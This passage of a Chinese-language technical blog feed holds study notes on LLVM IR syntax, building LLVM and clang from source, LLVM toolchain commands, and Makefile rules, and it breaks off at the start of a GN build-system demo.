来声明后面紧跟类型和值的常量。</li><li>LLVM 允许声明和定义函数。以关键字 <code>define</code> 开始，后面紧跟返回类型，然后是函数名。返回 32 字节整数的 <code>main</code> 的简单定义类似于：<code>define i32 @main() &#123; ; some LLVM assembly code that returns i32 &#125;</code>。</li><li>函数声明：以 puts 函数为例，<code>declare i32 puts(i8*)</code>。该声明以关键字 <code>declare</code> 开始，后面紧跟着返回类型、函数名，以及该函数的可选参数列表。该声明必须是全局范围的。</li><li>每个函数均以返回语句结尾。有两种形式的返回语句：<code>ret &lt;type&gt; &lt;value&gt;</code> 或 <code>ret void</code>。对于简单的主例程，使用 <code>ret i32 0</code> 就足够了。</li><li>使用 <code>call &lt;function return type&gt; &lt;function name&gt; &lt;optional function arguments&gt;</code> 来调用函数。注意，每个函数参数都必须放在其类型的前面。返回一个 6 位的整数并接受一个 36 位的整数的函数测试的语法如下：<code>call i6 @test( i36 %arg1 )</code>。</li><li>如果函数入口块没有明确的标签，则会分配标签<code>％0</code>，那么该块中的第一个未命名的临时块将为<code>％1</code>，以此类推。</li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h3><p>都写在注释里了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;hello.c&#39;   </span><br><span class="line">source_filename &#x3D; &quot;hello.c&quot;  ;指明源文件名</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;  </span><br><span class="line">;指明机器架构和数据布局</span><br><span class="line">target triple &#x3D; &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line">;定义字符串 hello world，unnamed_addr表明该地址不重要，并且可以合并两个相同的函数。</span><br><span class="line">@str &#x3D; private unnamed_addr constant [14 x i8] c&quot;Hello worl1d.\00&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">;定义函数，local_unnamed_addr表明该地址在模块内是不明显的</span><br><span class="line">define i32 @main() local_unnamed_addr #0 &#123;</span><br><span class="line">;调用puts函数</span><br><span class="line">  %1 &#x3D; tail call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @str, i64 0, i64 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">;函数声明</span><br><span class="line">declare i32 @puts(i8* nocapture readonly) local_unnamed_addr #1</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags&#x2F;RELEASE_600&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html#artrelatedtopics">getelementptr</a>：</p><p><code>getelementptr</code> 的第一个参数是全局字符串变量的指针。要单步执行全局变量的指针，则需要使用第一个索引，即 <code>i64 0</code>。因为 <code>getelementptr</code> 指令的第一个参数必须始终是 <code>pointer</code> 类型的值，所以第一个索引会单步调试该指针。0 值表示从该指针起偏移 0 元素偏移量。我的开发计算机运行的是 64 位 Linux，所以该指针是 8 字节。第二个索引 (<code>i64 0</code>) 用于选择字符串的第 0 个元素，该元素是作为 <code>puts</code> 的参数来提供的。</p><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/langref/">https://llvm.zcopy.site/docs/langref/</a></p><p><a href="http://www.nagain.com/activity/article/7/">http://www.nagain.com/activity/article/7/</a></p><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html">https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm 环境搭建示例</title>
      <link href="posts/a75e0ae9/"/>
      <url>posts/a75e0ae9/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本机：<code>ubuntu 18.04</code></p><h3 id="直接安装"><a href="#直接安装" class="headerlink" title="直接安装"></a>直接安装</h3><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install llvm</span><br></pre></td></tr></table></figure><p>配置环境变量：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">If you need to have llvm first in your PATH run:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/llvm/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find llvm you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/llvm/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/llvm/include&quot;</span><br></pre></td></tr></table></figure><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install llvm</span><br><span class="line">$ sudo apt install clang</span><br></pre></td></tr></table></figure><h3 id="llvm和clang混合编译"><a href="#llvm和clang混合编译" class="headerlink" title="llvm和clang混合编译"></a>llvm和clang混合编译</h3><p>要求：</p><table><thead><tr><th align="center">Package</th><th align="center">Version</th><th>Notes</th></tr></thead><tbody><tr><td align="center"><a href="http://gcc.gnu.org/">GCC</a></td><td align="center">&gt;=5.1.0</td><td>C/C++ compiler1</td></tr><tr><td align="center"><a href="http://www.python.org/">python</a></td><td align="center">&gt;=2.7</td><td>Automated test suite2</td></tr><tr><td align="center"><a href="http://zlib.net/">zlib</a></td><td align="center">&gt;=1.2.3.4</td><td>Compression library3</td></tr><tr><td align="center"><a href="http://savannah.gnu.org/projects/make">GNU Make</a></td><td align="center">3.79, 3.79.1</td><td>Makefile/build processor4</td></tr><tr><td align="center"><a href="http://cmake.org/">CMake</a></td><td align="center">&gt;=3.4.3</td><td>Makefile/workspace generator</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install cmake</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/llvm/llvm-project.git</span><br><span class="line">$ <span class="built_in">cd</span> llvm-project</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only -DLLVM_ENABLE_PROJECTS=clang ../llvm</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p><code>--enable-optimized</code>  打开优化，默认情况下是关闭的。这样会生成大量 debug 信息，需要较多的磁盘空间。</p><p><code>--enable-targets=host-only</code> 选择目标平台，默认情况下会生成所有平台的。 <code>host-only</code> 只选择本机即可。</p><blockquote><p>错误处理：</p><p>collect2: fatal error: ld terminated with signal 9 [Killed]</p><p>虚拟机内存不够，调大即可。</p><p>collect2: error: ld returned 1 exit status</p><p>个人情况是硬盘容量不足，拓展一下即可。</p></blockquote><h3 id="单独编译llvm"><a href="#单独编译llvm" class="headerlink" title="单独编译llvm"></a>单独编译llvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载环境包：https://releases.llvm.org/download.html</span><br><span class="line">$ mkdir llvm </span><br><span class="line">$ <span class="built_in">cd</span> llvm</span><br><span class="line">$ tar xf llvm-7.0.1.src.tar.xz</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only  ../llvm-7.0.1.src</span><br><span class="line">$ cmake --build . <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><p>第9行代码对应如下：</p><blockquote><p><code>cmake -G &lt;generator&gt; [options] ../llvm</code></p><p>Some common build system generators are:</p><ul><li><code>Ninja</code> 大多数llvm开发人员都使用Ninja。</li><li><code>Unix Makefiles</code> —用于生成与make兼容的并行makefile。</li><li><code>Visual Studio</code> —用于生成Visual Studio项目和解决方案。</li><li><code>Xcode</code>  用于生成Xcode项目</li></ul><p><a href="https://llvm.org/docs/GettingStarted.html">https://llvm.org/docs/GettingStarted.html</a></p><p>还有一些可选的 options：</p><ul><li><code>-DCMAKE_INSTALL_PREFIX=directory</code> 明确LLVM工具和库被安装的位置，默认在/usr/local下。</li><li><code>-DCMAKE_BUILD_TYPE=type</code> Debug选项，默认就是使用Debug，可以改为Release减少不必要的文件。</li><li><code>-DLLVM_ENABLE_ASSERTIONS=On</code> 编译时开启断言检查(assertion)，默认就是开启<br>  <strong>要注意整个llvm和build的绝对路径中不要出现中文，否则会出问题。</strong></li></ul></blockquote><h2 id="LLVM工具链的使用示例"><a href="#LLVM工具链的使用示例" class="headerlink" title="LLVM工具链的使用示例"></a>LLVM工具链的使用示例</h2><ol><li><p>Clang示例</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$ clang hello.c -o hello</span></span><br></pre></td></tr></table></figure><p> 此时得到一个可执行的 <code>hello</code>文件。c</p></li><li><p>将<code>hello.c</code>编译为LLVM字节码文件</p><p> <code>$ clang -O3 -emit-llvm hello.c -c -o hello.bc</code></p><p>  ps：<code>-emit-llvm</code>选项可与<code>-S</code>或<code>-c</code>选项一起使用，以分别为代码发出LLVM <code>.ll</code>或<code>.bc</code>文件。</p></li><li><p>使用两种方式运行程序:</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">$ lli hello.bc <span class="comment"># show llvm JIT</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用<code>llvm-dis</code>命令查看LLVM的汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis &lt; hello.bc | less</span><br></pre></td></tr></table></figure></li><li><p>使用<a href="https://llvm.zcopy.site/docs/man/llc.html">llc</a>将程序编译为本地汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello.bc -o hello.s</span><br></pre></td></tr></table></figure></li></ol><p>命令小结：</p><ul><li><code>llvm-as</code>：把LLVM IR从文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/start.html">https://llvm.zcopy.site/docs/start.html</a></p><p><a href="http://clang.llvm.org/get_started.html">http://clang.llvm.org/get_started.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile 学习</title>
      <link href="posts/3a49d5b4/"/>
      <url>posts/3a49d5b4/</url>
      
        <content type="html"><![CDATA[<h1 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h1><p><code>makefile</code>是一个包含一组指令的文件，<code>make build</code>自动化工具使用这些指令來生成目标。</p><p>优点：自动化编译，可以极大的提高了软件开发的效率。</p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><strong>target</strong></p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。</p><p><strong>prerequisites</strong></p><p>生成该target所依赖的文件和<code>/</code>或target。反斜杠（ <code>\</code> ）是换行符的意思。</p><p><strong>command</strong></p><p>该target要执行的命令（任意的shell命令）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello:hello.c</span></span><br><span class="line">gcc -c hello.c</span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br></pre></td></tr></table></figure><h2 id="工作流程浅析"><a href="#工作流程浅析" class="headerlink" title="工作流程浅析"></a>工作流程浅析</h2><ol><li>make会在当前目录下找<code>Makefile / makefile</code></li><li>找到后，会寻找第一个目标文件(target) <code>hello</code>，并作为最终的目标文件。</li><li>如果 <code>hello</code>不存在活或其依赖 <code>hello.c</code>的修改时间比 <code>hello</code>新，那么就会执行<code>command</code>来重新生成 <code>target</code></li></ol><p><strong>PS：一定要以一个 <code>Tab</code> 键作为开头</strong></p><p>make 会一层一层的寻找文件依赖关系，直至编译出第一个目标文件。如果在寻找的过程中出现错误，那么 make 就会退出并报错。</p><p>make 所着重的是寻找依赖关系，<code>command</code>的命令的正确与否是不关心的。</p><h2 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h2><h3 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h3><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>make支持三个通配符： <code>*</code> ， <code>?</code> 和 <code>~</code> </p><p><code>*</code>：匹配 0 或多个字符</p><p><code>?</code>：匹配任意一个字符</p><p><code>~</code>：Linux，<code>~</code> = <code>$HOME</code> Mac，则需要自己设置 <code>HOME</code>目录</p><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPATH = src:../headers</span><br></pre></td></tr></table></figure><p>设置搜索路径，<code>make</code>执行时，如果当前目录找不到，则到指定路径取搜寻。</p><p>另一种则是：<code>vpath</code>关键字，注意<strong>全小写</strong>。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vpath &lt;pattern&gt; &lt;directories&gt; #为符合模式&lt;pattern&gt;的文件指定搜索目录&lt;directories&gt;。</span><br><span class="line">vpath &lt;pattern&gt; #清除符合模式&lt;pattern&gt;的文件的搜索目录。</span><br><span class="line">vpath    #清除所有已被设置好了的文件搜索目录。</span><br><span class="line">eg1:</span><br><span class="line">vpath %.h ../headers #现在当前目录搜索，若没找到则在“../headers”目录下搜索所有以 .h 结尾的文件。</span><br><span class="line">eg2:</span><br><span class="line">vpath %.c foo:bar   #make按照vpath语句的先后顺序来执行搜索</span><br><span class="line">vpath %   blish   #其表示 .c 结尾的文件，先在“foo”目录，然后是“blish”，最后是“bar”目录。</span><br></pre></td></tr></table></figure><h4 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h4><p>“伪目标”并不是一个文件，只是一个标签，由于“伪目标”不是文件，所以make无法生成它的依赖关系和决定它是否要执行。</p><p>PS：伪目标不能和文件重名。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean  <span class="comment">#使用“.PHONY”来显式地指明一个目标是“伪目标”</span></span><br></pre></td></tr></table></figure><p>例如清空规则：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><h3 id="书写命令"><a href="#书写命令" class="headerlink" title="书写命令"></a>书写命令</h3><h4 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令"></a>显示命令</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo 正在编译XXX模块......</span><br></pre></td></tr></table></figure><p><code>@</code>是必须的，如果<code>make</code>执行时，带入<code>make</code>参数 <code>-n</code> 或 <code>--just-print</code> ，那么其只是显示命令，但不会执行命令。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5</span><br><span class="line">    pwd   <span class="comment">#打印当前目录</span></span><br><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5;pwd <span class="comment">#打印/home/focu5下的目录</span></span><br></pre></td></tr></table></figure><h4 id="命令出错"><a href="#命令出错" class="headerlink" title="命令出错"></a>命令出错</h4><p>有些命令执行结果的正确与否我们是不关心的，那么有两种办法可以解决：</p><ol><li>在命令前加 <code>-</code></li><li>执行 <code>make</code>的时候，加上 <code>-i / --ignore-errors</code>参数（这种做法会忽略掉所有命令的错误</li></ol><p>另外：参数的是 <code>-k</code> 或是 <code>--keep-going</code> ，指如果某规则中的命令出错了，那么就终止该规则的执行，但继续执行其它规则。</p><h4 id="定义命令包"><a href="#定义命令包" class="headerlink" title="定义命令包"></a>定义命令包</h4><p>定义这种命令序列的语法以 <code>define</code> 开始，以 <code>endef</code> 结束，骨架如下:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> 包名</span><br><span class="line">...</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line"><span class="keyword">endef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 $(包名) 来调用包</span></span><br></pre></td></tr></table></figure><p>包名不能和变量名重名。</p><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = hello.c</span><br><span class="line">tag = hello</span><br><span class="line"><span class="section">hello: <span class="variable">$(objects)</span></span></span><br><span class="line">gcc -o hello <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="section">.PHONA: clean</span></span><br><span class="line"><span class="section">.PHONA: clean1</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o *.out</span><br><span class="line"></span><br><span class="line"><span class="section">clean1:</span></span><br><span class="line">rm -f <span class="variable">$(tag)</span></span><br></pre></td></tr></table></figure><p>变量命名可以包含：数字、字符、下划线（可以是数字开头），但不能含有 <code>:</code> 、 <code>#</code> 、 <code>=</code> 或是空字符（空格、回车等）。<strong>变量名对大小写是敏感的</strong>。</p><p>变量在声明的时候要进行初始化，使用时最好用 <code>()或&#123;&#125;</code>将变量包裹起来，eg：<code>$(obj)   $&#123;obj&#125; </code> 另外<code>$$</code>则表示使用<code>$</code></p><p>变量会在使用它的时候精确展开。</p><h4 id="变量高级用法"><a href="#变量高级用法" class="headerlink" title="变量高级用法"></a>变量高级用法</h4><p><strong>变量值替换</strong></p><p>格式: <code>$(var:a=b)</code> 或是 <code>$&#123;var:a=b&#125;</code> 把 <code>a</code>均替换成 <code>b</code></p><p><strong>变量嵌套</strong></p><p>也就是用变量的值去做新的变量。个人觉得追加更简单一些。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">a := $(<span class="variable">$(x)</span>)  <span class="comment">#a = $(y), $(a) = z</span></span><br><span class="line">a := <span class="variable">$(x)</span> <span class="variable">$(y)</span> <span class="comment"># $(a) = y z</span></span><br><span class="line"></span><br><span class="line">y += <span class="variable">$(x)</span>  <span class="comment">#$(y) = z y</span></span><br></pre></td></tr></table></figure><h3 id="隐含规则"><a href="#隐含规则" class="headerlink" title="隐含规则"></a>隐含规则</h3><p>示例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①</span></span><br><span class="line">foo : foo.o bar.o</span><br><span class="line">    cc –o foo foo.o bar.o <span class="variable">$(CFLAGS)</span> <span class="variable">$(LDFLAGS)</span></span><br><span class="line"><span class="comment">#②</span></span><br><span class="line">foo.o : foo.c</span><br><span class="line">    cc –c foo.c <span class="variable">$(CFLAGS)</span></span><br><span class="line">bar.o : bar.c</span><br><span class="line">    cc –c bar.c <span class="variable">$(CFLAGS)</span></span><br></pre></td></tr></table></figure><p><code>makefile</code>会有自动推导的过程，所以我们写成①的形式会更简洁一些。</p><p>部分隐含规则：</p><ul><li><p><code>CC</code> : C语言编译程序。默认命令是 <code>cc</code>   </p></li><li><p><code>CXX</code> : C++语言编译程序。默认命令是 <code>g++</code></p></li><li><p><code>RM</code> : 删除文件命令。默认命令是 <code>rm –f</code></p></li><li><p><code>CFLAGS</code> : C语言编译器参数。</p></li><li><p><code>CXXFLAGS</code> : C++语言编译器参数。</p></li><li><p><code>LDFLAGS</code> : 链接器参数。（如： <code>ld</code> ）</p></li><li><p>使用的时候请用：$(CC) 、$(RM) 等</p><p>  <a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html">更详细参考这里</a></p></li></ul><p>示例：</p><p>把所有的 <code>.c</code> 文件都编译成 <code>.o</code> 文件.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>其中， <code>$@</code> 表示所有的目标的挨个值， <code>$&lt;</code> 表示了所有依赖目标的挨个值。</p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><ul><li><code>$@</code> : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么， <code>$@</code> 就是匹配于目标中模式定义的集合。</li><li><code>$%</code> : 仅当目标是函数库文件中，表示规则中的目标成员名。</li><li><code>$&lt;</code> : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 <code>%</code> ）定义的，那么 <code>$&lt;</code> 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</li><li><code>$?</code> : 所有比目标新的依赖目标的集合。以空格分隔。</li><li><code>$^</code> : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那么这个变量会去除重复的依赖目标，只保留一份。</li><li><code>$+</code> : 这个变量很像 <code>$^</code> ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</li></ul><h3 id="Makefile中一些GNU约定俗成的伪目标"><a href="#Makefile中一些GNU约定俗成的伪目标" class="headerlink" title="Makefile中一些GNU约定俗成的伪目标"></a>Makefile中一些GNU约定俗成的伪目标</h3><table><thead><tr><th align="left">伪目标</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">all</td><td align="left">所有目标的目标，其功能一般是编译所有的目标</td></tr><tr><td align="left">clean</td><td align="left">删除所有被make创建的文件</td></tr><tr><td align="left">install</td><td align="left">安装已编译好的程序，其实就是把目标可执行文件拷贝到指定的目录中去</td></tr><tr><td align="left">print</td><td align="left">列出改变过的源文件</td></tr><tr><td align="left">tar</td><td align="left">把源程序打包备份. 也就是一个tar文件</td></tr><tr><td align="left">dist</td><td align="left">创建一个压缩文件, 一般是把tar文件压成Z文件. 或是gz文件</td></tr><tr><td align="left">TAGS</td><td align="left">更新所有的目标, 以备完整地重编译使用</td></tr><tr><td align="left">check 或 test</td><td align="left">一般用来测试makefile的流程</td></tr></tbody></table><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://seisman.github.io/how-to-write-makefile/index.html"> 跟我一起写Makefile</a></p><p><a href="https://cloud.tencent.com/developer/article/1343894">https://cloud.tencent.com/developer/article/1343894</a></p><h1 id="GN"><a href="#GN" class="headerlink" title="GN"></a>GN</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>GN是一种元构建系统，生成Ninja构建文件（Ninja build files），相较GYP而言，具有如下优点：</p><ol><li>可读性更好，更容易编写和维护。</li><li>速度更快，谷歌官方给的数据是20倍的速度提升。</li><li>修改GN文件后，执行ninja构建时会自动更新Ninja构建文件。</li><li>更简单的模块依赖，提供了public_deps, data_deps等，在GYP中，只有一种目标依赖，导致依赖关系错综复杂，容易引入不必要的模块依赖。</li><li>提供了更好的工具查询模块依赖图谱。这在GYP构建系统中是一个噩梦，要查一个目标依赖哪些模块或者一个模块被哪些目标依赖几乎是不可能的。</li><li>更好的调试支持。在GN中，只需要一条print语句就可以解决。</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>在 chromium 的 src 目录下创建一个新的 <code>test</code>文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 